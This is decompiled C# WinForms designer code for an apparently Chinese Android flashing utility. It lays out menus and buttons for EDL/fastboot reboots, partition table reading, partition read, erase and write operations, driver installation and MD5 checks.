		((ToolStripItem)this.m_13d).Name = "修复分区表ToolStripMenuItem";
		((ToolStripItem)this.m_13d).Size = new Size(152, 26);
		((ToolStripItem)this.m_13d).Text = "修复分区表";
		((ToolStripItem)this.m_13d).Click += _180;
		((ToolStripItem)_13e).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)_13e).Image = (Image)componentResourceManager.GetObject("读取分区表ToolStripMenuItem.Image");
		((ToolStripItem)_13e).Name = "读取分区表ToolStripMenuItem";
		((ToolStripItem)_13e).Size = new Size(152, 26);
		((ToolStripItem)_13e).Text = "读取分区表";
		((ToolStripItem)_13e).Click += _181;
		((ToolStripDropDownItem)this.m_b3).DropDownItems.AddRange(new ToolStripItem[5]
		{
			(ToolStripItem)this.m_b4,
			(ToolStripItem)this.m_be,
			(ToolStripItem)this.m_14e,
			(ToolStripItem)this.m_14f,
			(ToolStripItem)this.m_177
		});
		((ToolStripItem)this.m_b3).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_b3).Name = "辅助工具ToolStripMenuItem";
		((ToolStripItem)this.m_b3).Size = new Size(68, 21);
		((ToolStripItem)this.m_b3).Text = "辅助工具";
		((ToolStripItem)this.m_b4).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_b4).Image = (Image)componentResourceManager.GetObject("设备管理器ToolStripMenuItem.Image");
		((ToolStripItem)this.m_b4).Name = "设备管理器ToolStripMenuItem";
		((ToolStripItem)this.m_b4).Size = new Size(184, 26);
		((ToolStripItem)this.m_b4).Text = "设备管理器";
		((ToolStripItem)this.m_b4).Click += b3;
		((ToolStripItem)this.m_be).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_be).Image = (Image)componentResourceManager.GetObject("打开CMDToolStripMenuItem.Image");
		((ToolStripItem)this.m_be).Name = "打开CMDToolStripMenuItem";
		((ToolStripItem)this.m_be).Size = new Size(184, 26);
		((ToolStripItem)this.m_be).Text = "CMD行符";
		((ToolStripItem)this.m_be).Click += dd;
		((ToolStripItem)this.m_14e).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_14e).Image = (Image)componentResourceManager.GetObject("mD校验ToolStripMenuItem.Image");
		((ToolStripItem)this.m_14e).Name = "mD校验ToolStripMenuItem";
		((ToolStripItem)this.m_14e).Size = new Size(184, 26);
		((ToolStripItem)this.m_14e).Text = "MD5校验";
		((ToolStripItem)this.m_14e).Click += _18c;
		((ToolStripItem)this.m_14f).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_14f).Image = (Image)componentResourceManager.GetObject("生成MD5校验ToolStripMenuItem.Image");
		((ToolStripItem)this.m_14f).Name = "生成MD5校验ToolStripMenuItem";
		((ToolStripItem)this.m_14f).Size = new Size(184, 26);
		((ToolStripItem)this.m_14f).Text = "生成校验文件";
		((ToolStripItem)this.m_14f).Click += _18d;
		((ToolStripItem)this.m_177).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_177).Image = (Image)componentResourceManager.GetObject("制作GKiToolStripMenuItem.Image");
		((ToolStripItem)this.m_177).Name = "制作GKiToolStripMenuItem";
		((ToolStripItem)this.m_177).Size = new Size(184, 26);
		((ToolStripItem)this.m_177).Text = "制作GKi镜像";
		((ToolStripItem)this.m_177).Visible = false;
		((ToolStripItem)this.m_177).Click += _1b5;
		((ToolStripItem)this.m_9a).BackColor = Color.White;
		((ToolStripItem)this.m_9a).Name = "toolStripMenuItem7";
		((ToolStripItem)this.m_9a).Size = new Size(66, 21);
		((ToolStripItem)this.m_9a).Text = "EDL功能";
		((ToolStripItem)this.m_9a).Click += a5;
		((ToolStripItem)this.m_9b).Name = "toolStripMenuItem8";
		((ToolStripItem)this.m_9b).Size = new Size(180, 22);
		((ToolStripItem)this.m_9b).Text = "9008重启到开机";
		((ToolStripItem)this.m_9b).Click += a3;
		((ToolStripItem)this.m_9c).Name = "toolStripMenuItem9";
		((ToolStripItem)this.m_9c).Size = new Size(68, 21);
		((ToolStripItem)this.m_9c).Text = "辅助工具";
		((ToolStripItem)this.m_9d).Name = "toolStripMenuItem10";
		((ToolStripItem)this.m_9d).Size = new Size(180, 22);
		((ToolStripItem)this.m_9d).Text = "设备管理器";
		((ToolStripItem)this.m_9d).Click += a4;
		((ToolStripItem)this.m_9e).Name = "aDB功能ToolStripMenuItem";
		((ToolStripItem)this.m_9e).Size = new Size(32, 19);
		((ToolStripItem)this.m_9f).Name = "重启设备ToolStripMenuItem";
		((ToolStripItem)this.m_9f).Size = new Size(32, 19);
		((ToolStripItem)this.m_a0).Name = "重启到BootloaderToolStripMenuItem";
		((ToolStripItem)this.m_a0).Size = new Size(32, 19);
		((ToolStripItem)this.m_a1).Name = "重启到fastbootdToolStripMenuItem";
		((ToolStripItem)this.m_a1).Size = new Size(32, 19);
		((ToolStripItem)this.m_a2).Name = "重启到recoveryToolStripMenuItem";
		((ToolStripItem)this.m_a2).Size = new Size(32, 19);
		((ToolStripItem)this.m_a3).Name = "重启到edlToolStripMenuItem";
		((ToolStripItem)this.m_a3).Size = new Size(32, 19);
		((ToolStripItem)this.m_a4).Name = "重启到ToolStripMenuItem";
		((ToolStripItem)this.m_a4).Size = new Size(32, 19);
		((ToolStripItem)this.m_a5).Name = "fB功能ToolStripMenuItem";
		((ToolStripItem)this.m_a5).Size = new Size(32, 19);
		((ToolStripItem)this.m_a6).Name = "重启到开机ToolStripMenuItem";
		((ToolStripItem)this.m_a6).Size = new Size(32, 19);
		((ToolStripItem)this.m_a7).Name = "重启到bootloaderToolStripMenuItem1";
		((ToolStripItem)this.m_a7).Size = new Size(32, 19);
		((ToolStripItem)this.m_a8).Name = "重启到fastbootdToolStripMenuItem1";
		((ToolStripItem)this.m_a8).Size = new Size(32, 19);
		((ToolStripItem)this.m_a9).Name = "重启到recoveryToolStripMenuItem1";
		((ToolStripItem)this.m_a9).Size = new Size(32, 19);
		((ToolStripItem)aa).Name = "重启到EdlToolStripMenuItem1";
		((ToolStripItem)aa).Size = new Size(32, 19);
		((Control)this.m_b5).AutoSize = true;
		((Control)this.m_b5).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_b5).ForeColor = Color.DodgerBlue;
		((Control)this.m_b5).Location = new Point(324, 87);
		((Control)this.m_b5).Name = "labelWindows";
		((Control)this.m_b5).Size = new Size(61, 17);
		((Control)this.m_b5).TabIndex = 39;
		((Control)this.m_b5).Text = "Windows";
		((Control)this.m_b5).Click += _15f;
		((Control)this.m_cf).AutoSize = true;
		((Control)this.m_cf).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_cf).ForeColor = Color.DodgerBlue;
		((Control)this.m_cf).Location = new Point(7, 6);
		((Control)this.m_cf).Name = "label2";
		((Control)this.m_cf).Size = new Size(63, 17);
		((Control)this.m_cf).TabIndex = 47;
		((Control)this.m_cf).Text = "Flash Log";
		((Control)this.m_cd).AutoSize = true;
		((Control)this.m_cd).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_cd).ForeColor = Color.DodgerBlue;
		((Control)this.m_cd).Location = new Point(8, 22);
		((Control)this.m_cd).Name = "label1";
		((Control)this.m_cd).Size = new Size(32, 17);
		((Control)this.m_cd).TabIndex = 44;
		((Control)this.m_cd).Text = "速率";
		((Control)this.m_cd).Click += _116;
		((System.Windows.Forms.Timer)this.m_c0).Interval = 1000;
		((System.Windows.Forms.Timer)this.m_c0).Tick += _12d;
		((UIProcessBar)this.m_c1).FillColor = Color.White;
		((Control)this.m_c1).Font = new Font("新宋体", 12f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_c1).ForeColor = Color.DimGray;
		((Control)this.m_c1).Location = new Point(11, 643);
		((Control)this.m_c1).MinimumSize = new Size(3, 3);
		((Control)this.m_c1).Name = "uiProcessBar1";
		((UIControl)this.m_c1).Radius = 10;
		((UIProcessBar)this.m_c1).RectColor = Color.LightSkyBlue;
		((Control)this.m_c1).Size = new Size(834, 28);
		((Control)this.m_c1).TabIndex = 46;
		((Control)this.m_c1).Text = "uiProcessBar2";
		((Control)this.m_c5).Cursor = Cursors.IBeam;
		((Control)this.m_c5).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_c5).Location = new Point(10, 132);
		((Control)this.m_c5).Margin = new Padding(4, 5, 4, 5);
		((Control)this.m_c5).MinimumSize = new Size(1, 16);
		((Control)this.m_c5).Name = "textBox3";
		((Control)this.m_c5).Padding = new Padding(5);
		((UIUserControl)this.m_c5).RectColor = Color.Silver;
		((UIPanel)this.m_c5).ShowText = false;
		((Control)this.m_c5).Size = new Size(379, 23);
		((Control)this.m_c5).TabIndex = 53;
		((UIUserControl)this.m_c5).TextAlignment = ContentAlignment.MiddleLeft;
		((UITextBox)this.m_c5).Watermark = "RAW";
		((UITextBox)this.m_c5).TextChanged += _162;
		((Control)this.m_d9).Cursor = Cursors.Hand;
		((Control)this.m_d9).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_d9).ForeColor = Color.FromArgb(64, 64, 64);
		((Control)this.m_d9).Location = new Point(376, 5);
		((Control)this.m_d9).MinimumSize = new Size(1, 1);
		((Control)this.m_d9).Name = "uiRadioButton2";
		((Control)this.m_d9).Size = new Size(68, 19);
		((Control)this.m_d9).TabIndex = 54;
		((Control)this.m_d9).Text = "EMMC";
		((UIRadioButton)this.m_d9).CheckedChanged += _118;
		((Control)this.m_da).Cursor = Cursors.Hand;
		((Control)this.m_da).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_da).ForeColor = Color.FromArgb(64, 64, 64);
		((Control)this.m_da).Location = new Point(324, 4);
		((Control)this.m_da).MinimumSize = new Size(1, 1);
		((Control)this.m_da).Name = "uiRadioButton1";
		((UIControl)this.m_da).Radius = 1;
		((Control)this.m_da).Size = new Size(51, 21);
		((Control)this.m_da).TabIndex = 53;
		((Control)this.m_da).Text = "UFS";
		((UIRadioButton)this.m_da).CheckedChanged += _117;
		((Control)this.m_cc).Cursor = Cursors.Hand;
		((Control)this.m_cc).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_cc).ForeColor = Color.FromArgb(48, 48, 48);
		((Control)this.m_cc).Location = new Point(109, 6);
		((Control)this.m_cc).MinimumSize = new Size(1, 1);
		((Control)this.m_cc).Name = "checkBox1";
		((Control)this.m_cc).Size = new Size(77, 14);
		((Control)this.m_cc).TabIndex = 52;
		((Control)this.m_cc).Text = "自动识别";
		((UICheckBox)this.m_cc).CheckedChanged += ee;
		((Control)this.m_c7).Cursor = Cursors.Hand;
		((Control)this.m_c7).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_c7).ForeColor = Color.FromArgb(48, 48, 48);
		((Control)this.m_c7).Location = new Point(191, 7);
		((Control)this.m_c7).MinimumSize = new Size(1, 1);
		((Control)this.m_c7).Name = "uiCheckBox1";
		((Control)this.m_c7).Size = new Size(76, 14);
		((Control)this.m_c7).TabIndex = 51;
		((Control)this.m_c7).Text = "上传日志";
		((Control)this.m_c7).Visible = false;
		((UICheckBox)this.m_c7).CheckedChanged += eb;
		((Control)this.m_c3).Cursor = Cursors.Arrow;
		((Control)this.m_c3).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_c3).Location = new Point(10, 96);
		((Control)this.m_c3).Margin = new Padding(4, 5, 4, 5);
		((Control)this.m_c3).MinimumSize = new Size(1, 16);
		((Control)this.m_c3).Name = "textBox1";
		((Control)this.m_c3).Padding = new Padding(5);
		((UIUserControl)this.m_c3).RectColor = Color.Silver;
		((UIPanel)this.m_c3).ShowText = false;
		((Control)this.m_c3).Size = new Size(463, 23);
		((Control)this.m_c3).TabIndex = 36;
		((UIUserControl)this.m_c3).TextAlignment = ContentAlignment.MiddleLeft;
		((UITextBox)this.m_c3).Watermark = "双击选择引导文件";
		((UITextBox)this.m_c3).DoubleClick += _135;
		((Control)this.m_de).Controls.Add((Control)this.m_df);
		((Control)this.m_de).Controls.Add((Control)this.m_e0);
		((Control)this.m_de).Controls.Add((Control)this.m_e1);
		((Control)this.m_de).Controls.Add((Control)this.m_e2);
		((Control)this.m_de).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_de).ForeColor = Color.DodgerBlue;
		((Control)this.m_de).Location = new Point(16, 89);
		((Control)this.m_de).Name = "groupBox7";
		((Control)this.m_de).Size = new Size(386, 140);
		((Control)this.m_de).TabIndex = 10;
		((GroupBox)this.m_de).TabStop = false;
		((Control)this.m_de).Text = "payload_dumper云解包";
		((Control)this.m_df).Cursor = Cursors.Hand;
		((UIButton)this.m_df).FillColor = Color.LightSkyBlue;
		((Control)this.m_df).Font = new Font("微软雅黑", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_df).Location = new Point(198, 60);
		((Control)this.m_df).MinimumSize = new Size(1, 1);
		((Control)this.m_df).Name = "uiButton12";
		((UIButton)this.m_df).RectColor = Color.Silver;
		((Control)this.m_df).Size = new Size(158, 29);
		((Control)this.m_df).TabIndex = 4;
		((Control)this.m_df).Text = "粘贴";
		((UIButton)this.m_df).TipsFont = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_df).Click += _12b;
		((UIComboBox)this.m_e0).DataSource = null;
		((UIUserControl)this.m_e0).FillColor = Color.White;
		((Control)this.m_e0).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((UIComboBox)this.m_e0).ItemHoverColor = Color.FromArgb(155, 200, 255);
		((UIComboBox)this.m_e0).Items.AddRange(new object[2] { "boot", "init_boot" });
		((UIComboBox)this.m_e0).ItemSelectForeColor = Color.FromArgb(235, 243, 255);
		((Control)this.m_e0).Location = new Point(32, 63);
		((Control)this.m_e0).Margin = new Padding(4, 5, 4, 5);
		((Control)this.m_e0).MinimumSize = new Size(63, 0);
		((Control)this.m_e0).Name = "uiComboBox2";
		((Control)this.m_e0).Padding = new Padding(0, 0, 30, 2);
		((UIUserControl)this.m_e0).RectColor = Color.Silver;
		((Control)this.m_e0).Size = new Size(150, 26);
		((UIDropControl)this.m_e0).SymbolSize = 24;
		((Control)this.m_e0).TabIndex = 3;
		((UIUserControl)this.m_e0).TextAlignment = ContentAlignment.MiddleLeft;
		((UIDropControl)this.m_e0).Watermark = "分区名";
		((Control)this.m_e1).Cursor = Cursors.IBeam;
		((Control)this.m_e1).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_e1).Location = new Point(32, 24);
		((Control)this.m_e1).Margin = new Padding(4, 5, 4, 5);
		((Control)this.m_e1).MinimumSize = new Size(1, 16);
		((Control)this.m_e1).Name = "uiTextBox2";
		((Control)this.m_e1).Padding = new Padding(5);
		((UIUserControl)this.m_e1).RectColor = Color.Silver;
		((UIPanel)this.m_e1).ShowText = false;
		((Control)this.m_e1).Size = new Size(324, 23);
		((Control)this.m_e1).TabIndex = 2;
		((UIUserControl)this.m_e1).TextAlignment = ContentAlignment.MiddleLeft;
		((UITextBox)this.m_e1).Watermark = "bin_URL";
		((Control)this.m_e2).Cursor = Cursors.Hand;
		((UIButton)this.m_e2).FillColor = Color.LightSkyBlue;
		((Control)this.m_e2).Font = new Font("微软雅黑", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_e2).Location = new Point(32, 97);
		((Control)this.m_e2).MinimumSize = new Size(1, 1);
		((Control)this.m_e2).Name = "uiButton11";
		((UIButton)this.m_e2).RectColor = Color.Silver;
		((Control)this.m_e2).Size = new Size(324, 25);
		((Control)this.m_e2).TabIndex = 1;
		((Control)this.m_e2).Text = "提取分区";
		((UIButton)this.m_e2).TipsFont = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_e2).Click += _129;
		((Control)this.m_dd).Controls.Add((Control)this.m_db);
		((Control)this.m_dd).Controls.Add((Control)this.m_ce);
		((Control)this.m_dd).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_dd).ForeColor = Color.DodgerBlue;
		((Control)this.m_dd).Location = new Point(23, 82);
		((Control)this.m_dd).Name = "groupBox9";
		((Control)this.m_dd).Size = new Size(382, 117);
		((Control)this.m_dd).TabIndex = 8;
		((GroupBox)this.m_dd).TabStop = false;
		((Control)this.m_dd).Text = "驱动专区";
		((Control)this.m_db).Cursor = Cursors.Hand;
		((UIButton)this.m_db).FillColor = Color.LightSkyBlue;
		((Control)this.m_db).Font = new Font("微软雅黑", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_db).Location = new Point(32, 73);
		((Control)this.m_db).MinimumSize = new Size(1, 1);
		((Control)this.m_db).Name = "uiButton9";
		((Control)this.m_db).Size = new Size(324, 26);
		((Control)this.m_db).TabIndex = 4;
		((Control)this.m_db).Text = "安装安卓驱动";
		((UIButton)this.m_db).TipsFont = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_db).Click += _11a;
		((Control)this.m_ce).Cursor = Cursors.Hand;
		((UIButton)this.m_ce).FillColor = Color.LightSkyBlue;
		((Control)this.m_ce).Font = new Font("微软雅黑", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_ce).Location = new Point(32, 26);
		((Control)this.m_ce).MinimumSize = new Size(1, 1);
		((Control)this.m_ce).Name = "uiButton1";
		((Control)this.m_ce).Size = new Size(324, 29);
		((Control)this.m_ce).TabIndex = 2;
		((Control)this.m_ce).Text = "安装高通驱动";
		((UIButton)this.m_ce).TipsFont = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_ce).Click += f5;
		((Control)this.m_ed).BackColor = Color.FromArgb(80, 160, 255);
		((ButtonBase)this.m_ed).FlatStyle = FlatStyle.Flat;
		((Control)this.m_ed).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_ed).ForeColor = Color.White;
		((Control)this.m_ed).Location = new Point(356, 507);
		((Control)this.m_ed).Name = "button3";
		((Control)this.m_ed).Size = new Size(110, 35);
		((Control)this.m_ed).TabIndex = 54;
		((Control)this.m_ed).Text = "刷写";
		((ButtonBase)this.m_ed).UseVisualStyleBackColor = false;
		((Control)this.m_ed).Click += _69;
		((Control)this.m_ec).Cursor = Cursors.Hand;
		((UIButton)this.m_ec).FillColor = Color.LightSkyBlue;
		((Control)this.m_ec).Font = new Font("微软雅黑 Light", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_ec).Location = new Point(390, 132);
		((Control)this.m_ec).MinimumSize = new Size(1, 1);
		((Control)this.m_ec).Name = "button6";
		((UIControl)this.m_ec).Radius = 8;
		((UIButton)this.m_ec).RectColor = Color.LightSkyBlue;
		((Control)this.m_ec).Size = new Size(83, 23);
		((UISymbolButton)this.m_ec).Symbol = 61563;
		((UISymbolButton)this.m_ec).SymbolSize = 20;
		((Control)this.m_ec).TabIndex = 42;
		((Control)this.m_ec).Text = "阅览";
		((UIButton)this.m_ec).TipsFont = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_ec).Click += e5;
		((Control)this.m_d7).Controls.Add((Control)this.m_d6);
		((Control)this.m_d7).Controls.Add((Control)this.m_d0);
		((Control)this.m_d7).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_d7).ForeColor = Color.DodgerBlue;
		((Control)this.m_d7).Location = new Point(6, 66);
		((Control)this.m_d7).Name = "groupBox5";
		((Control)this.m_d7).Size = new Size(469, 284);
		((Control)this.m_d7).TabIndex = 33;
		((GroupBox)this.m_d7).TabStop = false;
		((Control)this.m_d7).Text = "分区表";
		((Control)this.m_d6).AutoSize = true;
		((Control)this.m_d6).BackColor = Color.White;
		((Control)this.m_d6).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_d6).ForeColor = Color.Cyan;
		((Control)this.m_d6).Location = new Point(11, 25);
		((Control)this.m_d6).Name = "checkBox7";
		((Control)this.m_d6).Size = new Size(15, 14);
		((Control)this.m_d6).TabIndex = 32;
		((ButtonBase)this.m_d6).UseVisualStyleBackColor = false;
		((CheckBox)this.m_d6).CheckedChanged += _10a;
		((ListView)this.m_d0).BorderStyle = BorderStyle.None;
		((ListView)this.m_d0).CheckBoxes = true;
		((ListView)this.m_d0).Columns.AddRange(new ColumnHeader[5]
		{
			(ColumnHeader)this.m_d1,
			(ColumnHeader)this.m_d2,
			(ColumnHeader)this.m_d3,
			(ColumnHeader)this.m_d4,
			(ColumnHeader)this.m_169
		});
		((Control)this.m_d0).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_d0).ForeColor = SystemColors.MenuHighlight;
		((ListView)this.m_d0).FullRowSelect = true;
		((ListView)this.m_d0).HideSelection = false;
		((Control)this.m_d0).Location = new Point(6, 18);
		((Control)this.m_d0).Name = "listView2";
		((Control)this.m_d0).Size = new Size(458, 256);
		((Control)this.m_d0).TabIndex = 11;
		((ListView)this.m_d0).UseCompatibleStateImageBehavior = false;
		((ListView)this.m_d0).View = View.Details;
		((ListView)this.m_d0).SelectedIndexChanged += _10b;
		((Control)this.m_d0).DoubleClick += f9;
		((ColumnHeader)this.m_d1).Text = "         Partition";
		((ColumnHeader)this.m_d1).Width = 107;
		((ColumnHeader)this.m_d2).Text = "        File";
		((ColumnHeader)this.m_d2).Width = 76;
		((ColumnHeader)this.m_d3).Text = "       SD";
		((ColumnHeader)this.m_d3).Width = 68;
		((ColumnHeader)this.m_d4).Text = "    File Path";
		((ColumnHeader)this.m_d4).Width = 130;
		((ColumnHeader)this.m_169).Text = "Size";
		((ColumnHeader)this.m_169).Width = 85;
		((Control)this.m_f8).Controls.Add((Control)this.m_f9);
		((Control)this.m_f8).Controls.Add((Control)this.m_103);
		((Control)this.m_f8).Location = new Point(8, 356);
		((Control)this.m_f8).Name = "tabControl1";
		((TabControl)this.m_f8).SelectedIndex = 0;
		((Control)this.m_f8).Size = new Size(472, 179);
		((Control)this.m_f8).TabIndex = 41;
		((Control)this.m_f9).Controls.Add((Control)this.m_f0);
		((TabPage)this.m_f9).Location = new Point(4, 26);
		((Control)this.m_f9).Name = "tabPage3";
		((Control)this.m_f9).Padding = new Padding(3);
		((Control)this.m_f9).Size = new Size(464, 149);
		((TabPage)this.m_f9).TabIndex = 0;
		((Control)this.m_f9).Text = "Mi Assistant Flash";
		((TabPage)this.m_f9).UseVisualStyleBackColor = true;
		((Control)this.m_f0).Controls.Add((Control)this.m_16a);
		((Control)this.m_f0).Controls.Add((Control)this.m_16b);
		((Control)this.m_f0).Controls.Add((Control)this.m_10d);
		((Control)this.m_f0).Controls.Add((Control)this.m_f3);
		((Control)this.m_f0).Controls.Add((Control)this.m_f4);
		((Control)this.m_f0).Controls.Add((Control)f1);
		((Control)this.m_f0).Controls.Add((Control)this.m_f2);
		((Control)this.m_f0).Controls.Add((Control)this.m_d8);
		((Control)this.m_f0).ForeColor = Color.LightSkyBlue;
		((Control)this.m_f0).Location = new Point(6, 6);
		((Control)this.m_f0).Name = "groupBox2";
		((Control)this.m_f0).Size = new Size(452, 130);
		((Control)this.m_f0).TabIndex = 40;
		((GroupBox)this.m_f0).TabStop = false;
		((Control)this.m_f0).Text = "操作";
		((Checkbox)this.m_16a).AutoCheck = true;
		((Control)this.m_16a).Font = new Font("Microsoft YaHei UI", 9f);
		((Control)this.m_16a).Location = new Point(142, 16);
		((Control)this.m_16a).Name = "checkbox16";
		((Control)this.m_16a).Size = new Size(102, 32);
		((Control)this.m_16a).TabIndex = 60;
		((Control)this.m_16a).Text = "保留用户数据";
		((Checkbox)this.m_16a).CheckedChanged += _1a7;
		((Checkbox)this.m_16b).AutoCheck = true;
		((Control)this.m_16b).Font = new Font("Microsoft YaHei UI", 9f);
		((Control)this.m_16b).Location = new Point(10, 15);
		((Control)this.m_16b).Name = "checkbox15";
		((Control)this.m_16b).Size = new Size(128, 32);
		((Control)this.m_16b).TabIndex = 59;
		((Control)this.m_16b).Text = "操作完成自动重启";
		((Control)this.m_10d).Font = new Font("Microsoft YaHei UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Tag)this.m_10d).Image = (Image)componentResourceManager.GetObject("tag18.Image");
		((Control)this.m_10d).Location = new Point(10, 53);
		((Control)this.m_10d).Name = "tag18";
		((Control)this.m_10d).Size = new Size(435, 28);
		((Control)this.m_10d).TabIndex = 44;
		((Control)this.m_10d).Text = "TWRP操作区域";
		((Control)this.m_f3).Cursor = Cursors.Hand;
		((UIButton)this.m_f3).FillColor = Color.LightSkyBlue;
		((Control)this.m_f3).Font = new Font("微软雅黑 Light", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_f3).Location = new Point(10, 89);
		((Control)this.m_f3).MinimumSize = new Size(1, 1);
		((Control)this.m_f3).Name = "uiButton3";
		((UIButton)this.m_f3).RectColor = Color.LightSkyBlue;
		((Control)this.m_f3).Size = new Size(103, 32);
		((UISymbolButton)this.m_f3).Symbol = 61639;
		((UISymbolButton)this.m_f3).SymbolSize = 20;
		((Control)this.m_f3).TabIndex = 43;
		((Control)this.m_f3).Text = "读分区表";
		((UIButton)this.m_f3).TipsFont = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_f3).Click += f7;
		((Control)this.m_f4).Cursor = Cursors.Hand;
		((UIButton)this.m_f4).FillColor = Color.LightSkyBlue;
		((Control)this.m_f4).Font = new Font("微软雅黑 Light", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_f4).Location = new Point(119, 89);
		((Control)this.m_f4).MinimumSize = new Size(1, 1);
		((Control)this.m_f4).Name = "uiButton4";
		((UIButton)this.m_f4).RectColor = Color.LightSkyBlue;
		((Control)this.m_f4).Size = new Size(106, 32);
		((UISymbolButton)this.m_f4).Symbol = 61639;
		((UISymbolButton)this.m_f4).SymbolSize = 20;
		((Control)this.m_f4).TabIndex = 42;
		((Control)this.m_f4).Text = "读取分区";
		((UIButton)this.m_f4).TipsFont = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_f4).Click += _109;
		((Control)f1).Cursor = Cursors.Hand;
		((UIButton)f1).FillColor = Color.LightSkyBlue;
		((Control)f1).Font = new Font("微软雅黑 Light", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)f1).Location = new Point(231, 89);
		((Control)f1).MinimumSize = new Size(1, 1);
		((Control)f1).Name = "uiButton5";
		((UIButton)f1).RectColor = Color.LightSkyBlue;
		((Control)f1).Size = new Size(105, 32);
		((UISymbolButton)f1).Symbol = 361741;
		((UISymbolButton)f1).SymbolSize = 20;
		((Control)f1).TabIndex = 41;
		((Control)f1).Text = "擦除分区";
		((UIButton)f1).TipsFont = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)f1).Click += _107;
		((Control)this.m_f2).Cursor = Cursors.Hand;
		((UIButton)this.m_f2).FillColor = Color.LightSkyBlue;
		((Control)this.m_f2).Font = new Font("微软雅黑 Light", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_f2).Location = new Point(342, 89);
		((Control)this.m_f2).MinimumSize = new Size(1, 1);
		((Control)this.m_f2).Name = "uiButton6";
		((UIButton)this.m_f2).RectColor = Color.LightSkyBlue;
		((Control)this.m_f2).Size = new Size(104, 32);
		((UISymbolButton)this.m_f2).Symbol = 357527;
		((UISymbolButton)this.m_f2).SymbolSize = 20;
		((Control)this.m_f2).TabIndex = 40;
		((Control)this.m_f2).Text = "写入分区";
		((UIButton)this.m_f2).TipsFont = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_f2).Click += _101;
		((UIComboBox)this.m_d8).DataSource = null;
		((UIUserControl)this.m_d8).FillColor = Color.White;
		((UIUserControl)this.m_d8).FillColorGradientDirection = FlowDirection.LeftToRight;
		((Control)this.m_d8).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((UIComboBox)this.m_d8).ItemHoverColor = Color.FromArgb(155, 200, 255);
		((UIComboBox)this.m_d8).ItemSelectForeColor = Color.FromArgb(235, 243, 255);
		((Control)this.m_d8).Location = new Point(253, 21);
		((Control)this.m_d8).Margin = new Padding(4, 5, 4, 5);
		((Control)this.m_d8).MinimumSize = new Size(63, 0);
		((Control)this.m_d8).Name = "uiComboBox1";
		((Control)this.m_d8).Padding = new Padding(0, 0, 30, 2);
		((UIUserControl)this.m_d8).RectColor = Color.Silver;
		((UIComboBox)this.m_d8).ScrollBarColor = Color.Green;
		((UIComboBox)this.m_d8).ScrollBarStyleInherited = false;
		((Control)this.m_d8).Size = new Size(192, 23);
		((UIDropControl)this.m_d8).SymbolSize = 24;
		((Control)this.m_d8).TabIndex = 37;
		((UIUserControl)this.m_d8).TextAlignment = ContentAlignment.MiddleLeft;
		((UIDropControl)this.m_d8).Watermark = "点击查找分区";
		((UIComboBox)this.m_d8).TextChanged += _115;
		((UIComboBox)this.m_d8).SelectedIndexChanged += _167;
		((UIDropControl)this.m_d8).KeyDown += _138;
